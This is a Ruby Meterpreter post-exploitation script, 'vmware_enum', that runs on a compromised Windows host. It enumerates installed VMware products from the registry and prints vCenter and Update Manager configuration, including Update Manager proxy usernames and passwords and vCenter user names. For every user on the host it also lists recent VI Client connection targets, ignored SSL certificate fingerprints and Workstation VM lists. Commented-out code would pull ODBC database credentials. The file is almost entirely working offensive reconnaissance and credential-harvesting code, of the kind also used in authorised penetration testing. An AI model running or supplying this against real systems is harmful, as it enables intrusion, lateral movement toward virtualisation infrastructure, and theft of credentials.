# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
@client = client

opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu." ]
)

opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line("vmware_enum -- Enumerates VMware Configurations for VMware Products")
    print_line("USAGE: run vmware_enum")
    print_line(opts.usage)
    raise Rex::Script::Completed
  end
}

def check_prods()
  key = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\VMware, Inc.', KEY_READ)
  sfmsvals = key.enum_key
  print_status("The Following Products are installed on this host:")
  sfmsvals.each do |p|
    print_status("\t#{p}")
  end
  return sfmsvals
end

def check_vmsoft
  installed = false
  key = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE', KEY_READ)
  sfmsvals = key.enum_key
  if sfmsvals.include?("VMware, Inc.")
    print_status("VMware Products are Installed in Host")
    installed = true
  else
    print_error("No VMware Products where found in this Host.")
  end
  key.close
  return installed
end

def enum_vcenter
  print_status("Information about Virtual Center:")
  vc_dbuser = nil
  vc_dbencpass = nil
  vc_version = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter","InstalledVersion")
  vc_serial = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter","Serial")
  vc_dbinstance = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter","DBInstanceName")
  vc_dbtype = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter","DBServerType")
  vc_tomcatver = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter\\Tomcat","Version")
  vc_type = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter","GroupType")
  vc_odbcname = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter\\DB","1")
  vc_odbctype = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter\\DB","4")
  #	vc_odctrustcon = reg_getvaldata("HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{vc_odbcname}","TrustedConnection")
  #	print_line("*")
  #	if vc_odctrustcon.to_i != 1
  #		vc_dbuser = reg_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter\\DB","2")
  #		print_line("*")
  #		vc_dbencpass = reg_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VirtualCenter\\DB","3")
  #		print_line("*")
  #	end
  vc_dbname = registry_getvaldata("HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{vc_odbcname.chomp}","Database")
  vc_dbserver = registry_getvaldata("HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{vc_odbcname.chomp}","Server")
  print_status("\tVersion: #{vc_version}")
  print_status("\tSerial: #{vc_serial}")
  print_status("\tvCenter Type: #{vc_type}")
  print_status("\tTomcat Version: #{vc_tomcatver}")
  print_status("\tDatabase Instance: #{vc_dbinstance}")
  print_status("\tDatabase Type: #{vc_dbtype}")
  print_status("\tDatabase Name: #{vc_dbname}")
  print_status("\tDatabase Server: #{vc_dbserver}")
  print_status("\tODBC Name: #{vc_odbcname}")
  print_status("\tODBC Type: #{vc_odbctype}")
  #	if vc_odctrustcon.to_i != 1
  #		print_status("\tODBC Username: #{vc_dbuser}")
  #		print_status("\tODBC Password: #{vc_dbencpass}")
  #	end
end

def enum_viclient
  print_status("Information about VMware VI Client:")
  vi_pluggins = nil
  begin
    vi_version = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Virtual Infrastructure Client\\4.0","InstalledVersion")
    vi_pluggins = registry_enumvals("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Virtual Infrastructure Client\\Plugins")
  rescue
  end
  print_status("\tVersion: #{vi_version}")
  if vi_pluggins
    vi_pluggins.each do |pi|
      if pi=~ /Converter/
        print_status("\tPlugin: VMware Converter")
      elsif pi =~/UM/
        print_status("\tPlugin: VMware Update Manager")
      else
        print_status("\tPlugin: #{pi}")
      end
    end
  end

  if not is_system?
    recentconns = registry_getvaldata("HKCU\\Software\\VMware\\VMware Infrastructure Client\\Preferences","RecentConnections").split(",")
    print_status("Recent VI Client Connections:")
    recentconns.each do |c|
      print_status("\t#{c}")
    end
    ignore_ssl = registry_enumkeys("HKCU\\Software\\VMware\\Virtual Infrastructure Client\\Preferences\\UI\\SSLIgnore")
    if ignore_ssl.length > 0
      print_status("\tIgnored SSL Certs for")
      ignore_ssl.each do |issl|
        ssl_key = registry_getvaldata("HKCU\\Software\\VMware\\Virtual Infrastructure Client\\Preferences\\UI\\SSLIgnore",issl)
        print_status("\tHost: #{issl} SSL Fingerprint: #{ssl_key}")
      end

    end
  else
    user_sid = []
    key = "HKU\\"
    root_key, base_key = @client.sys.registry.splitkey(key)
    open_key = @client.sys.registry.open_key(root_key, base_key)
    keys = open_key.enum_key
    keys.each do |k|
      user_sid << k if k =~ /S-1-5-21-\d*-\d*-\d*-\d{3,6}$/
    end
    user_sid.each do |us|
      begin
      enumed_user = registry_getvaldata("HKU\\#{us}\\Volatile Environment","USERNAME")
      print_status("\tRecent VI Client Connections for #{enumed_user}:")
      recentconns = registry_getvaldata("HKU\\#{us}\\Software\\VMware\\VMware Infrastructure Client\\Preferences","RecentConnections").split(",")
      recentconns.each do |c|
        print_status("\t#{c}")
      end
      ignore_ssl = registry_enumkeys("HKU\\#{us}\\Software\\VMware\\Virtual Infrastructure Client\\Preferences\\UI\\SSLIgnore")
      if ignore_ssl.length > 0
        print_status("\tIgnored SSL Certs for #{enumed_user}:")
        ignore_ssl.each do |issl|
          ssl_key = registry_getvaldata("HCU\\#{us}\\Software\\VMware\\Virtual Infrastructure Client\\Preferences\\UI\\SSLIgnore",issl)
          print_status("\tHost: #{issl} SSL Fingerprint: #{ssl_key}")
        end

      end
      rescue
        print_status("\tUser appears to have not used the software.")
      end
    end
  end
end

def enum_vum
  print_status("Information about VMware Update Manager:")
  begin
    vum_version = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","InstalledVersion")
    vum_server = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","VUMServer")
    vum_dbtype = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","DBServerType")
    vum_direct2web = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","DirectWebAccess")
    vum_useproxy = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","UseProxy")
    vum_proxyserver = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","ProxyServer")
    vum_proxyport = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","ProxyPort")
    vum_proxyuser = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","ProxyUserName")
    vum_proxypass = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","ProxyPassword")
    vum_vcentersrv = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","VCServer")
    vum_vcenterusr = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","VCUserName")
    vum_patchstore = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager","PatchStore")
    vum_odbcname = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager\\DB","1")
    vum_odbctype = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager\\DB","4")
    vum_dbname = registry_getvaldata("HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{vum_odbcname.chomp}","Database")
    vum_dbserver = registry_getvaldata("HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{vum_odbcname.chomp}","Server")
    #		vum_trustedcon = reg_getvaldata("HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{vum_odbcname.chomp}","TrustedConnection")
    #		if vum_trustedcon.to_i != 1
    #			vum_odbcusename = reg_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager\\DB","2")
    #			vum_odbcpass = reg_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Update Manager\\DB","3")
    #		end
    print_status("\tVersion: #{vum_version}")
    print_status("\tServer: #{vum_server}")
    print_status("\tPatch Store: #{vum_patchstore}")
    print_status("\tDatabse Type: #{vum_dbtype}")
    print_status("\tUses Proxy: #{vum_useproxy}")
    print_status("\tProxy User: #{vum_proxyuser}")
    print_status("\tProxy Password: #{vum_proxypass}")
    print_status("\tVirtual Center: #{vum_vcentersrv}")
    print_status("\tVirtual Center User: #{vum_vcenterusr}")
    print_status("\tProxy Server: #{vum_proxyserver}:#{vum_proxyport}")
    print_status("\tDatabase Name: #{vum_dbname}")
    print_status("\tDatabase Server: #{vum_dbserver}")
    print_status("\tODBC Name: #{vum_odbcname}")
    print_status("\tODBC Type: #{vum_odbctype}")
    #		print_status("\t ODBC Trusted: #{vum_trustedcon}")
    #		if vum_trustedcon.to_i != 1
    #			print_status("\tODBC Username: #{vum_odbcusename}")
    #			print_status("\tODBC Password: #{vum_odbcpass}")
    #		end
  rescue ::Exception => e
    print_status("Error: #{e.class} #{e}")
  end

end

def enum_vdm
  print_status("Information about VMware VDM Broker:")
  vdm_version = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware VDM","ProductVersion")
  print_status("\tVersion: #{vdm_version}")
end

def enum_powercli
  print_status("Information about PowerCLI:")
  pcli_version =  registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware vSphere PowerCLI","InstalledVersion")
  pcli_install_path = registry_getvaldata("HKLM\\SOFTWARE\\VMware, Inc.\\VMware vSphere PowerCLI","InstallPath")
  begin
    pcli_poweshell_policy = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\WindowsPowerShell","ExecutionPolicy")
  rescue
    pcli_poweshell_policy = "Restricted"
  end
  print_status("\tVersion: #{pcli_version}")
  print_status("\tInstalled Pat: #{pcli_install_path}")
  print_status("\tPowershell Execution Policy: #{pcli_poweshell_policy}")
end

#Function to enumerate the users if running as SYSTEM
def enum_users
  os = @client.sys.config.sysinfo['OS']
  users = []
  user = @client.sys.config.getuid
  path4users = ""
  sysdrv = @client.fs.file.expand_path("%SystemDrive%")

  if os =~ /7|Vista|2008/
    path4users = sysdrv + "\\users\\"
    profilepath = "\\AppData\\Local\\VMware\\"
  else
    path4users = sysdrv + "\\Documents and Settings\\"
    profilepath = "\\Application Data\\VMware\\"
  end

  if user == "NT AUTHORITY\\SYSTEM"
    print_status("Running as SYSTEM extracting user list..")
    @client.fs.dir.foreach(path4users) do |u|
      userinfo = {}
      next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
      userinfo['username'] = u
      userinfo['userappdata'] = path4users + u + profilepath
      users << userinfo
    end
  else
    userinfo = {}
    uservar = @client.fs.file.expand_path("%USERNAME%")
    userinfo['username'] = uservar
    userinfo['userappdata'] = path4users + uservar + profilepath
    users << userinfo
  end
  return users
end
def enum_vihosupdt
  hosts = []
  print_status("Information about VMware vSphere Host Update Utility:")
  enum_users.each do |u|
    print_status("\tESX/ESXi Hosts added for Updates for user #{u['username']}:")
    begin
    @client.fs.dir.foreach(u['userappdata']+"VIU\\hosts\\") do |vmdir|
      next if vmdir =~ /^(\.|\.\.)$/
      print_status("\t#{vmdir}")
    end
    rescue
    end
  end
end

def enum_vmwarewrk
  config = ""
  name = ""
  print_status("Enumerating VMware Workstation VM's:")
  fav_file = ""
  enum_users.each do |u|
    print_status("\tVM's for user #{u['username']}:")
    path = u['userappdata'].gsub(/Local/,"Roaming")
    account_file = @client.fs.file.new(path + "\\favorites.vmls", "rb")
    until account_file.eof?
      fav_file << account_file.read
    end
  end
  fav_file.each_line do |l|

    if l =~ /config/
      print_status("\tConfiguration File: #{l.scan(/vmlist\d*.config \= (\".*\")/)}")
    end
    if l =~ /Name/
      print_status("\tVM Name: #{l.scan(/vmlist\d*.DisplayName \= (\".*\")/)}")
      print_status("")
    end
  end
end
if client.platform =~ /win32|win64/
  if check_vmsoft
    vmware_products = check_prods()
    if vmware_products.include?("VMware VirtualCenter")
      enum_vcenter
    end
    if vmware_products.include?("VMware Virtual Infrastructure Client")
      enum_viclient
    end
    if vmware_products.include?("VMware Update Manager")
      enum_vum
    end

    if vmware_products.include?("VMware VDM")
      enum_vdm
    end
    if vmware_products.include?("VMware vSphere PowerCLI")
      enum_powercli
    end
    if vmware_products.include?("VMware vSphere Host Update Utility 4.0")
      enum_vihosupdt
    end
    if vmware_products.include?("VMware Workstation")
      enum_vmwarewrk
    end
  else
    print_status("No VMware Products appear to be installed in this host")
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
